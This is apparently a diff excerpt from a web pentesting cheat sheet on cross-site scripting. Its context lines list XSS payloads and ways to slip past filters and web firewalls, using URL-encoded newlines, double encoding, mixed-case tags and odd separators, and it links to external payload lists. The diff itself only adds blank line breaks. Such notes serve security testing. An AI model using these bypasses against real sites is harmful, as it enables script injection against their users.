@@ -57,14 +57,22 @@ Is <.script>alert(1)</script.> filtered? Try: <br>
 <.randomfaketag id=x onwheel=alert(1)><br>
 <.a href=javascript:alert(1)>click</a.><br>
 <.ScRiPt>alert(1)<./ScRiPt><br>
+ <br>
 Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
+ <br>
 < and > can be replace with html entities &lt; and &gt; <br>
+ <br>
 You can try an XSS polyglot <br>
  https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626<br>
+ <br>
 Try New Lines to break the firewall - newline URL encoded is %0 - <.script>%0alert(1)</script> - try with different HTML tags <br>
+ <br>
 Try double encoding a newline break %2522 <br> 
+ <br>
 New Line breaks often work on <.a/href=%2522javascript:alert(1)> <br>
+ <br>
 Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
+ <br>
  Try bypassing spaces with a bullet if / does not work - <code><.svg•onload=alert(1)> </code><br>
  <br>
  <h3> Encoding </h3>
